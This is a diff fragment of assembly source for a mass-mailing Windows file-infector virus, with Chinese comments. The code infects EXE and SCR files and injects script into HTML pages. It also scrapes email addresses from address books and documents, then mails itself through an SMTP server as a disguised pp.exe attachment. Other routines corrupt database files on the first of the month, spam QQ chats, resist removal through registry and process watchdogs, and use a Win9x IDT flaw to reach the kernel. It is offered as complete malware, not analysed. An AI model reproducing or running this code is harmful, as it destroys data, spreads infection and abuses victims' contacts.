+    jz  short IsWabFile
+    cmp eax,'cda.'  ;得到FoxMail地址薄文件
+    jz  short IsDbFile
+    cmp eax,'bd.r'  ;得到Oicq地址薄文件
+    jz  short IsDbFile
+    cmp eax,'cod.'
+    jz  short IsDbFile
+    cmp eax,'slx.'
+    jz  short IsDbFile
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+IsWabFile:  
+    call    EnumWabMail,ebx
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+IsDbFile:
+    call    EnumDbMail,ebx
+    sub esp,100h
+    call    [esi.KnlGetSystemTime],esp
+    mov ax,[esp.stDay]
+    add esp,100h
+    cmp ax,01
+    jnz short NoDelDbFile
+    call    [esi.KnlLOpen],ebx,02
+    cmp eax,-1
+    jz  short NoDelDbFile
+    mov ebx,eax
+    call    [esi.KnlLWrite],ebx,esp,1234h
+    call    [esi.KnlLClose],ebx
+NoDelDbFile:    
+    ret
+OptMailFile endp
+    db  0e9h        ;静态反汇编干扰
+
+OptExeFile proc FindData: dword
+    ;为修改PE文件做准备，恢复文件信息
+    mov edi,FindData
+    lea ebx,[edi.cFileName]
+    call    GetFileExtName,ebx
+    cmp eax,'exe.'  ;传染EXE文件
+    jz  short IsExeFile
+    cmp eax,'rcs.'  ;传染SCR文件
+    jz  short IsExeFile
+    cmp eax,'mth.'
+    jz  short IsHtmFile
+    cmp eax,'lmth'
+    jz  short IsHtmFile
+    ret
+IsHtmFile:
+    call    [esi.KnlSetFileAttributesA],ebx,L 0
+    call    [esi.KnlLOpen],ebx,L 02
+    cmp eax,-1
+    jz  short OpenHtmlError
+    mov ebx,eax
+    call    FixHtmlFile,ebx
+    lea eax,[edi.ftCreationTime]
+    lea ecx,[edi.ftLastAccessTime]
+    lea edx,[edi.ftLastWriteTime]
+    call    [esi.KnlSetFileTime],ebx,eax,ecx,edx
+    call    [esi.KnlLClose],ebx
+OpenHtmlError:
+    lea ebx,[edi.cFileName]
+    call    [esi.KnlSetFileAttributesA],ebx,[edi.dwFileAttributes]
+    ret 
+IsExeFile:  
+    call    [esi.KnlSetFileAttributesA],ebx,L 0
+    call    [esi.KnlLOpen],ebx,L 02
+    cmp eax,-1
+    jz  short OpenFileError
+    mov ebx,eax
+    call    FixPeFile,ebx
+    lea eax,[edi.ftCreationTime]
+    lea ecx,[edi.ftLastAccessTime]
+    lea edx,[edi.ftLastWriteTime]
+    call    [esi.KnlSetFileTime],ebx,eax,ecx,edx
+    call    [esi.KnlLClose],ebx
+OpenFileError:
+    lea ebx,[edi.cFileName]
+    call    [esi.KnlSetFileAttributesA],ebx,[edi.dwFileAttributes]
+    ret
+OptExeFile endp
+    db  0e9h        ;静态反汇编干扰
+
+FixHtmlFile proc hHtmlFile:dword
+    pushad
+    sub esp,100h
+    call    BuildVirusPathInStack,esp
+    mov eax,esp
+    call    [esi.KnlLOpen],eax,0
+    add esp,100h
+    cmp eax,-1
+    jz  FixHtmlFileEnd
+    mov ebx,eax
+    call    GetEmlFile
+    db  'readme.eml',0
+GetEmlFile:
+    pop eax
+    call    [esi.KnlLCreat],eax,0
+    cmp eax,-1
+    jz  FixHtmlOver
+    mov edi,eax
+    call    MakeMailFile,0,ebx,edi
+    call    [esi.KnlLClose],edi
+    mov edi,hHtmlFile
+    call    [esi.KnlLSeek],edi,L 0,L 02
+    call    GetHtmlCode
+HtmlCodeStart:
+    db  0dh,0ah,'<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>',0
+GetHtmlCode:
+    pop eax
+    call    [esi.KnlLWrite],edi,eax,offset GetHtmlCode-offset HtmlCodeStart
+FixHtmlOver:
+    call    [esi.KnlLClose],ebx
+FixHtmlFileEnd:
+    popad
+    ret
+FixHtmlFile endp
+    db  0e9h        ;静态反汇编干扰
+
+FixPeFile proc hPeFile:dword  
+    ;修改PE文件，附加上病毒体
+    pushad
+    sub esp,MAX_BUFF_SIZE
+    mov edi,esp
+    call    [esi.KnlLRead],hPeFile,edi,MAX_BUFF_SIZE
+    movzx   eax,word ptr[edi+PEHeaderOffset]
+    add edi,eax
+    cmp edi,ebp     ;超界检查
+    ja  FixPeFileOver
+    cmp [edi.fhPEFlag],'EP';检查PE文件
+    jnz FixPeFileOver   
+    lea ebx,[edi.fhObjectTable00]
+    movzx   ecx,[edi.fhObjectCount]
+    dec ecx
+FindLastObjectTable:
+    add ebx,size ObjectTable
+    loop    FindLastObjectTable
+    cmp ebx,ebp     ;超界检查
+    ja  FixPeFileOver
+    mov eax,[edi.fhEntryRVA]
+    sub eax,[ebx.otRVA] ;检查病毒是否已经感染该PE文件
+    jb  short StartFixPeFile
+    add eax,[ebx.otPhysOffset]
+    call    [esi.KnlLSeek],hPeFile,eax,L 0
+    push    eax
+    mov eax,esp
+    call    [esi.KnlLRead],hPeFile,eax,04
+    pop eax
+    cmp ax,0e860h   ;是否是病毒指令
+    jz  FixPeFileOver
+BuildVirusCodeInStack:
+    
+StartFixPeFile: 
+    or  [ebx.otFlags],0e0000000h ;Code|Init|Exec|Read|Write[CIERW]属性
+    call    [esi.KnlLSeek],hPeFile,L 0,L 02;探测文件长度
+    cmp eax,-1
+    jz  short   FixPeFileOver
+    push    eax     ;保存文件长度信息
+    add eax,VirusSize
+    sub eax,[ebx.otPhysOffset];计算ObjectTable物理尺寸
+    mov [ebx.otPhysSize],eax
+    mov edx,[ebx.otVirtSize]
+    cmp eax,edx
+    jb  short NoFixVirtSize
+    mov [ebx.otVirtSize],eax;扩展虚拟尺寸
+    mov ecx,[edi.fhObjectAlign];取Object对齐信息
+    dec ecx
+    add eax,ecx     ;收尾数
+    add edx,ecx     ;收尾数
+    not ecx
+    and eax,ecx     ;取整数
+    and edx,ecx     ;取整数
+    sub eax,edx     ;计算新ImageSize增加值
+    add [edi.fhImageSize],eax;扩展映射总尺寸   
+NoFixVirtSize:
+    pop ecx     ;弹出文件长度信息
+    sub ecx,[ebx.otPhysOffset]
+    add ecx,[ebx.otRVA] ;计算出新PE程序入口
+    xchg    [edi.fhEntryRVA],ecx
+    add ecx,[edi.fhImageBase]
+    call    GetBaseAddress
+GetBaseAddress:
+    pop edi
+    sub edi,offset GetBaseAddress-offset OldEntryRVA
+    mov [edi],ecx   ;记录老PE程序入口
+WriteVirusToFile:
+    sub edi,offset OldEntryRVA-offset Start
+    call    [esi.KnlLWrite],hPeFile,edi,VirusSize
+    cmp eax,-1
+    jz  short FixPeFileOver
+WritePeHeader:
+    call    [esi.KnlLSeek],hPeFile,L 0,L 0
+    mov eax,esp
+    call    [esi.KnlLWrite],hPeFile,eax,MAX_BUFF_SIZE  
+FixPeFileOver:
+    add esp,MAX_BUFF_SIZE
+    popad
+    ret
+FixPeFile endp
+    db  0e9h        ;静态反汇编干扰
+
+FoundMailObject proc eMail: dword
+    pushad  
+    sub esp,100h
+    call    BuildVirusPathInStack,esp
+    mov edi,esp
+    call    [esi.KnlLOpen],edi,0
+    cmp eax,-1
+    jz  short FoundMailObjectEnd
+    mov ebx,eax 
+    call    SmtpSendMail,eMail,ebx
+    call    [esi.KnlLClose],ebx
+FoundMailObjectEnd:
+    add esp,100h
+    popad
+    ret
+FoundMailObject endp
+
+EnumDbMail proc DbFile: dword
+    pushad
+    call    [esi.KnlLOpen],DbFile,0
+    cmp eax,-1
+    jz  EnumDbMailEnd
+    mov ebx,eax
+    sub esp,100h
+ScanEmailStr:
+    mov edi,esp
+    xor edx,edx
+ReadDbFile:
+    push    edx
+    push    eax
+    mov eax,esp
+    call    [esi.KnlLRead],ebx,eax,01
+    pop ecx
+    pop edx
+    or  eax,eax
+    jz  short CloseDbFile
+    mov eax,esp
+    add eax,20h
+    cmp edi,eax
+    ja  short ScanEmailStr
+    cmp cl,'@'
+    jz  short IsMailAtFlag
+    cmp cl,'.'
+    jz  short IsMailDotFlag
+    cmp cl,30h
+    jb  short IsMailAddr
+    cmp cl,39h
+    jb  short StoreMailChar
+    cmp cl,41h
+    jb  short IsMailAddr
+    cmp cl,7eh
+    jb  short StoreMailChar
+IsMailAddr:
+    xor eax,eax
+    cld
+    stosb
+    cmp dh,01
+    jnz short ScanEmailStr
+    cmp dl,01
+    jb  short ScanEmailStr
+    sub edi,esp
+    cmp edi,6
+    jb  short ScanEmailStr
+    mov al,[esp]
+    cmp al,'@'
+    jz  short ScanEmailStr
+    cmp al,'.'
+    jz  short ScanEmailStr
+    call    FoundMailObject,esp
+    jmp short ScanEmailStr  
+IsMailDotFlag:  
+    inc dl
+    jmp short StoreMailChar
+IsMailAtFlag:
+    inc dh
+StoreMailChar:
+    mov al,cl
+    cld
+    stosb
+    jmp short ReadDbFile
+CloseDbFile:
+    call    [esi.KnlLClose],ebx
+    add esp,100h 
+EnumDbMailEnd:
+    popad
+    ret
+EnumDbMail endp
+
+EnumWabMail proc WabFile: dword
+    pushad
+    call    [esi.KnlLOpen],WabFile,0
+    cmp eax,-1
+    jz  short EnumWabMailEnd
+    mov ebx,eax
+    sub esp,100h
+    mov edi,esp
+    call    [esi.KnlLRead],ebx,edi,100h
+    cmp eax,100h
+    jnz short CloseWabFile
+    mov eax,[edi+60h] ;得到Unicode邮件名偏移
+    call    [esi.KnlLSeek],ebx,eax,0
+    mov ecx,[edi+64h] ;得到Unicode邮件名个数
+    cmp ecx,1000h
+    ja  short CloseWabFile 
+ContReadWabMail:
+    push    ecx
+    call    [esi.KnlLRead],ebx,edi,44h ;读一个记录  
+    sub esp,100h
+    mov eax,esp
+    call    [esi.KnlWideCharToMultiByte],0,200h,edi,-1,eax,100h,0,0
+    call    FoundMailObject,esp
+    add esp,100h
+    pop ecx
+    loop    short ContReadWabMail
+CloseWabFile:
+    add esp,100h
+    call    [esi.KnlLClose],ebx
+EnumWabMailEnd:
+    popad
+    ret
+EnumWabMail endp
+
+MakeMailFile proc eMail: dword,hVirFile: dword,hEmlFile: dword
+    local   OldEsp: dword
+    pushad
+    mov OldEsp,esp
+    sub esp,1000h
+    mov edi,esp
+    call    FormatMailHeader,edi,eMail
+    call    [esi.KnlLWrite],hEmlFile,edi,eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    mov edi,esp
+    call    [esi.KnlLRead],hVirFile,edi,3000h
+    cmp eax,-1
+    jz  short MakeMailFileEnd
+    mov edx,esp
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    mov edi,esp 
+    call    AnsiToBase64,edx,eax,edi
+    call    [esi.KnlLWrite],hEmlFile,edi,eax
+    mov dword ptr[esp],0a0d0a0dh
+    call    [esi.KnlLWrite],hEmlFile,edi,4
+MakeMailFileEnd:
+    mov esp,OldEsp
+    popad
+    mov eax,1
+    ret 
+MakeMailFile endp
+
+SmtpSendMail proc eMail: dword,hVirFile: dword
+    local   OldEsp: dword
+    local   RetVal: dword
+    pushad  
+    mov OldEsp,esp
+    mov RetVal,0
+    sub esp,1000h
+    mov edi,esp
+    call    [esi.WsWSAStartup],101h,esp
+    or  eax,eax
+    jnz SendMailQuit
+    call    [esi.Wssocket],AF_INET,SOCK_STREAM,0
+    cmp eax,-1h
+    jz  ClearSocket
+    mov ebx,eax
+    
+    mov [edi.sin_family],AF_INET
+    call    [esi.Wshtons],25
+    mov [edi.sin_port],ax
+    call    PushSmtpSrvr
+    db  'btamail.net.cn',0
+PushSmtpSrvr:
+    call    [esi.Wsgethostbyname]
+    or  eax,eax
+    jz  CloseSocket
+    mov eax,[eax.h_ip]
+    mov eax,[eax]
+    mov [edi.sin_addr],eax
+    call    [esi.Wsconnect],ebx,edi,size SOCKADDR
+    cmp eax,-1h
+    jz  CloseSocket
+
+    call    FormatMailHeader,edi,eMail
+    call    [esi.Wssend],ebx,edi,eax,0
+    call    [esi.KnlSleep],4000
+    
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    mov edi,esp
+    call    [esi.KnlLRead],hVirFile,edi,3000h
+    cmp eax,-1
+    jz  CloseSocket
+    
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    sub esp,1000h
+    mov [esp],eax
+    mov edx,esp
+    call    AnsiToBase64,edi,eax,edx
+    mov edi,esp
+    call    [esi.Wssend],ebx,edi,eax,0
+    call    [esi.KnlSleep],4000
+    
+    call    PushMailEnd
+    db  0dh,0ah,'.',0dh,0ah
+PushMailEnd:
+    pop eax
+    call    [esi.Wssend],ebx,eax,5,0
+    call    [esi.KnlSleep],4000
+    
+    call    PushMailQuit
+    db  'QUIT',0dh,0ah
+PushMailQuit:
+    pop eax
+    call    [esi.Wssend],ebx,eax,6,0
+    call    [esi.KnlSleep],4000
+
+    mov RetVal,1
+CloseSocket:
+    call    [esi.Wsclosesocket],ebx
+ClearSocket:
+    call    [esi.WsWSACleanup]
+SendMailQuit:
+    mov esp,OldEsp
+    popad
+    mov eax,RetVal
+    ret
+SmtpSendMail endp
+
+FormatMailHeader proc MailHeader: dword,eMail: dword
+    local   MailHeaderLong: dword
+    pushad  
+    mov eax,100h
+    sub esp,eax
+    mov edx,esp
+    push    eax
+    call    [esi.KnlGetComputerNameA],edx,esp
+    pop eax
+    call    PushMailData
+    db  'HELO btamail.net.cn',0dh,0ah
+    db  'MAIL FROM: imissyou@btamail.net.cn',0dh,0ah
+    db  'RCPT TO: %s',0dh,0ah
+    db  'DATA',0dh,0ah
+    db  'FROM: %s@yahoo.com',0dh,0ah
+    db  'TO: %s',0dh,0ah
+    db  'SUBJECT: %s is comming!',0dh,0ah          
+    db  'MIME-Version: 1.0',0dh,0ah
+    db  'Content-type: multipart/mixed; boundary="#BOUNDARY#"',0dh,0ah
+    db  0dh,0ah
+    db  '--#BOUNDARY#',0dh,0ah
+    db  'Content-Type: text/html',0dh,0ah
+    db  'Content-Transfer-Encoding: quoted-printable',0dh,0ah
+    db  0dh,0ah
+    db  '<html><HEAD></HEAD><body bgColor=3D#ffffff><iframe src=3Dcid:THE-CID height=3D0 width=3D0></iframe></body></html>',0dh,0ah
+    db  0dh,0ah
+    db  '--#BOUNDARY#',0dh,0ah  
+    db  'MIME-Version: 1.0',0dh,0ah
+    db  'Content-Type: audio/x-wav; name="pp.exe"',0dh,0ah
+    db  'Content-Transfer-Encoding: base64',0dh,0ah
+    db  'Content-id: THE-CID',0dh,0ah
+    db  0dh,0ah,0
+PushMailData:
+    pop eax
+    mov edi,esp
+    call    [esi.UserwsprintfA],MailHeader,eax,eMail,edi,eMail,edi
+    mov esp,edi
+    mov MailHeaderLong,eax
+    add esp,100h
+    popad
+    mov eax,MailHeaderLong
+    ret
+FormatMailHeader endp
+
+AnsiToBase64 proc AnsiBuff: dword,AnsiSize:dword,Base64Buff:dword
+    local   nBase64Size: dword
+    pushad
+    mov nBase64Size,0
+    call    GetBase64Char
+    Base64Char  db 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+            db 'abcdefghijklmnopqrstuvwxyz'
+            db '0123456789+/',0
+GetBase64Char:
+    pop esi ;esi=Offset Base64Char
+    mov edi,Base64Buff
+    mov edx,AnsiSize
+    shl edx,3 ;计算总位数   
+    xor ebx,ebx ;存索引
+ContTurn:
+    xor eax,eax ;存数值
+    mov ecx,6
+ContGetBit:
+    shl eax,1
+    call    GetBit,AnsiBuff,ebx 
+    dec edx
+    jz  short GetBitOver
+    inc ebx
+    loop    short ContGetBit
+    mov al,[esi+eax]
+    cld
+    stosb
+    inc nBase64Size
+    jmp short ContTurn
+GetBitOver:
+    dec ecx
+    shl eax,cl
+    mov al,[esi+eax]
+    cld
+    stosb
+    inc nBase64Size
+    shr ecx,1
+    add nBase64Size,ecx
+    mov al,'=' ;位数不够添“=”号，一个等号代表两位0
+    cld
+    rep stosb
+    xor al,al
+    stosb
+    popad
+    mov eax,nBase64Size
+    ret 
+AnsiToBase64 endp
+
+;AnsiToBase64子程序，得到一位的值
+GetBit proc uses ecx edx esi,SrcStr:DWORD,nCx:DWORD
+    mov esi,SrcStr
+    mov ecx,nCx
+    mov edx,ecx
+    shr edx,3
+    mov dl,[esi+edx]
+    not cl
+    and cl,07h
+    shr dl,cl
+    and dl,01h 
+    or  al,dl
+    ret
+GetBit endp
+    
+SetSehFrame:    ;ecx=忽略错误继续执行地址
+    pop eax     ;弹出返回地址
+    push    ecx     ;保存忽略错误继续执行地址
+    call    PushExceptionProc
+    jmp short Exception
+    db  0e9h        ;静态反汇编干扰
+PushExceptionProc:
+    push    fs:dword ptr[0]
+    mov fs:[0],esp
+    call    GetSaveEspAddr
+    push    dword ptr[edx]  ;保存以前的Esp值
+    mov [edx],esp   ;保存现在的Esp值
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+ClearSehFrame:
+    pop eax     ;弹出返回地址
+    call    GetSaveEspAddr
+    mov esp,[edx]   ;恢复Esp值
+    pop dword ptr[edx]  ;恢复原来的Esp值
+    pop fs:dword ptr[0]
+    pop ecx
+    pop ecx     ;弹出忽略错误继续执行地址
+    jmp eax
+    db  0e9h        ;静态反汇编干扰
+
+GetSaveEspAddr:
+    call    PushOffsetSaveEspAddr
+    dd  ?
+PushOffsetSaveEspAddr:
+    pop edx
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+Exception proc pRecord,pFrame,pContext,pDispatch    
+    call    PushSehBackProc
+    call    ClearSehFrame   ;自动清除意外Seh
+    jmp ecx
+    db  0e9h        ;静态反汇编干扰
+PushSehBackProc:
+    pop ecx
+    mov eax,pContext
+    mov [eax.cx_Eip],ecx
+    xor eax,eax     ;忽略错误继续执行
+    ret
+Exception endp
+
+UnzipVirusToFile: ;ebx=hFile
+    call    GetVirusZipData
+    db 04Dh,05Ah,050h,000h,001h,002h,000h,003h,004h,000h,001h,00Fh,000h,001h,0FFh,0FFh
+    db 000h,002h,0B8h,000h,007h,040h,000h,001h,01Ah,000h,022h,001h,000h,002h,0BAh,010h
+    db 000h,001h,00Eh,01Fh,0B4h,009h,0CDh,021h,0B8h,001h,04Ch,0CDh,021h,090h,090h,054h
+    db 068h,069h,073h,020h,070h,072h,06Fh,067h,072h,061h,06Dh,020h,06Dh,075h,073h,074h
+    db 020h,062h,065h,020h,072h,075h,06Eh,020h,075h,06Eh,064h,065h,072h,020h,057h,069h
+    db 06Eh,033h,032h,00Dh,00Ah,024h,037h,000h,088h,050h,045h,000h,002h,04Ch,001h,004h
+    db 000h,001h,0B5h,02Ch,0EFh,082h,000h,008h,0E0h,000h,001h,08Eh,081h,00Bh,001h,002h
+    db 019h,000h,001h,002h,000h,003h,006h,000h,007h,010h,000h,003h,010h,000h,003h,020h
+    db 000h,004h,040h,000h,002h,010h,000h,003h,002h,000h,002h,001h,000h,007h,003h,000h
+    db 001h,00Ah,000h,006h,050h,000h,003h,004h,000h,006h,002h,000h,005h,010h,000h,002h
+    db 020h,000h,004h,010h,000h,002h,010h,000h,006h,010h,000h,00Ch,030h,000h,002h,04Eh
+    db 000h,01Ch,040h,000h,002h,00Ch,000h,053h,043h,04Fh,044h,045h,000h,005h,010h,000h
+    db 003h,010h,000h,003h,002h,000h,003h,006h,000h,00Eh,020h,000h,002h,060h,044h,041h
+    db 054h,041h,000h,005h,010h,000h,003h,020h,000h,003h,002h,000h,003h,008h,000h,00Eh
+    db 040h,000h,002h,0C0h,02Eh,069h,064h,061h,074h,061h,000h,003h,010h,000h,003h,030h
+    db 000h,003h,002h,000h,003h,00Ah,000h,00Eh,040h,000h,002h,0C0h,02Eh,072h,065h,06Ch
+    db 06Fh,063h,000h,003h,010h,000h,003h,040h,000h,003h,002h,000h,003h,00Ch,000h,00Eh
+    db 040h,000h,002h,050h,000h,0FFh,000h,0FFh,000h,0FFh,000h,06Bh,0C3h,0FFh,025h,030h
+    db 030h,040h,000h,0FFh,000h,0FFh,000h,0FFh,000h,0FDh,028h,030h,000h,00Ah,038h,030h
+    db 000h,002h,030h,030h,000h,016h,046h,030h,000h,006h,046h,030h,000h,006h,04Bh,045h
+    db 052h,04Eh,045h,04Ch,033h,032h,02Eh,064h,06Ch,06Ch,000h,004h,053h,06Ch,065h,065h
+    db 070h,000h,0FFh,000h,0B5h,010h,000h,002h,00Ch,000h,003h,003h,030h,000h,0FFh,000h
+    db 0FFh,000h,0FFh,000h,0F9h,000h,000h
+GetVirusZipData:
+    pop edi     ;得到压缩后的PE文件数据
+ContUnZipVirus:
+    mov al,[edi]
+    inc edi
+    or  al,al
+    jz  short WriteVirusSomeBytes
+    push    eax
+    mov eax,esp
+    call    [esi.KnlLWrite],ebx,eax,01
+    pop eax
+    jmp short ContUnZipVirus
+WriteVirusSomeBytes:
+    movzx   ecx,byte ptr[edi]
+    inc edi
+    jecxz   UnzipVirusEnd   ;持续解压，直到遇到双0
+ContWriteVirusBytes:
+    push    ecx
+    push    eax
+    mov eax,esp
+    call    [esi.KnlLWrite],ebx,eax,01
+    pop eax
+    pop ecx
+    loop    ContWriteVirusBytes
+    jmp short ContUnZipVirus
+UnzipVirusEnd:
+    ret
+    db  0e9h        ;静态反汇编干扰
+
+SendQQMsg proc Param: dword
+    sub esp,100h
+    xor esi,esi
+BuildQQMsg:
+    mov edi,esp
+    mov ax,0a0dh
+    mov ecx,12
+    cld
+    rep stosw       
+    call    PushQQMsg
+    mov edx,[esp+esi*4] 
+    add esp,ecx
+StoreQQMsg:
+    mov al,[edx]
+    inc edx
+    cld
+    stosb
+    or  al,al
+    jnz short StoreQQMsg    
+    call    PushQQWndText
+    db  '发送消息',0
+PushQQWndText:
+    call    GetFindWindowA
+    FindWindowA9x2k dd ?
+GetFindWindowA:
+    pop eax
+    call    [eax],0
+    or  eax,eax
+    jz  short WaitForQQWnd
+    mov ebx,eax
+    call    GetGetWindow
+    GetWindow9x2k dd ?
+GetGetWindow:
+    pop eax
+    call    [eax],ebx,GW_CHILD
+    or  eax,eax
+    jz  short WaitForQQWnd
+    mov ebx,eax
+    call    GetSendMessageA
+    SendMessageA9x2k dd ?
+GetSendMessageA:
+    pop edi
+    sub esp,1000h
+    call    [edi],ebx,WM_GETTEXT,1000h,esp
+    add esp,1000h
+    or  eax,eax
+    jnz short WaitForQQWnd
+    call    [edi],ebx,WM_SETTEXT,1000h,esp
+    inc esi
+    and esi,07h
+    jnz short WaitForQQWnd
+    add esp,100h
+    ret
+WaitForQQWnd:
+    call    GetSleep
+    Sleep9x2k dd ?
+GetSleep:
+    pop eax
+    call    [eax],500
+    jmp BuildQQMsg  
+SendQQMsg endp
+    db  0e9h        ;静态反汇编干扰
+
+RegisterProtectProc proc hKey:dword
+    mov ebx,hKey    ;注册表保护过程，9x/2k实用  
+    sub esp,100h
+    mov edi,esp
+    call    GetProtectKeyName
+    db  'Runonce',0
+GetProtectKeyName:
+    pop esi
+    push    100h
+    call    GetAdvRegQueryValueExA
+    AdvRegQueryValueExA9x2k dd ?
+GetAdvRegQueryValueExA:
+    pop eax     ;读出原始值保存在堆栈中
+    call    [eax],ebx,esi,0,0,edi,esp
+    pop eax
+WaitRegChangeNotify:
+    call    GetAdvRegNotifyChangeKeyValue
+    AdvRegNotifyChangeKeyValue9x2k dd ?
+GetAdvRegNotifyChangeKeyValue:
+    pop eax     ;等待注册表改变通知
+    call    [eax],ebx,0,4,0,0
+    call    GetAdvRegSetValueExA
+    AdvRegSetValueExA9x2k dd ?
+GetAdvRegSetValueExA:
+    pop eax     ;还原原始值
+    call    [eax],ebx,esi,0,1,edi,100h  
+    jmp short WaitRegChangeNotify   
+RegisterProtectProc endp
+    db  0e9h        ;静态反汇编干扰
+
+ProcessProtectProc proc ProcID:dword    
+    call    GetKnlOpenProcess
+    KnlOpenProcess9x2k dd ?
+GetKnlOpenProcess:
+    pop eax 
+    call    [eax],PROCESS_ALL_ACCESS,0,ProcID
+    or  eax,eax     ;打开进程
+    jz  short ExitProtectProc
+    mov ebx,eax
+    call    GetKnlWaitForSingleObject
+    KnlWaitForSingleObject9x2k dd ?
+GetKnlWaitForSingleObject:
+    pop eax     ;等待进程结束
+    call    [eax],ebx,-1h
+    call    GetFileNameAddress
+GetFileNameAddress:
+    pop ecx
+    add ecx,offset FullPath-offset GetFileNameAddress
+    call    GetKnlWinExec
+    KnlWinExec9x2k dd ?
+GetKnlWinExec:
+    pop eax     ;重起病毒进程   
+    call    [eax],ecx,01
+ExitProtectProc:    
+    ret
+ProcessProtectProc endp
+
+ProcessProtectProcSize=$-offset ProcessProtectProc
+FullPath    db 0e9h
+
+MoveDataToKnl proc Src:dword,Des:dword,nCx:dword
+    pushad
+    push    eax
+    sidt    [esp-2]
+    pop eax
+    add eax,3*8     ;IDT03号
+    mov ebx,[eax]
+    mov edx,[eax+4]
+    call    SetIdt03
+    pushad
+    mov [eax],ebx   
+    mov [eax+4],edx
+    cld
+    rep movsb       ;复制代码/数据到内核代码指定位置
+    popad
+    iret    
+SetIdt03:
+    cli    
+    pop word ptr[eax]
+    pop word ptr[eax+6]
+    mov esi,Src
+    mov edi,Des
+    mov ecx,nCx
+    int 3;      ;利用Win9x,IDT漏洞进入系统内核
+    sti
+    popad
+    ret
+MoveDataToKnl endp
+    db  0e9h        ;静态反汇编干扰
+
+DbgMsg  proc pMsg:dword
+    pushad
+    mov eax,pMsg
+    call    [esi.UserMessageBoxA],0,eax,eax,0
+    popad
+    ret
+DbgMsg  endp
+    dd  0,0
+VirusEnd:
+    ;这里是变形解密代码
+    ret
+
+.code 
+
+Msg db  'Virus has running ok',0
+
+Exit:   
+    call    MessageBoxA,0,offset Msg,offset Msg,0
+    call    ExitProcess,L 0
+ 
+end Start
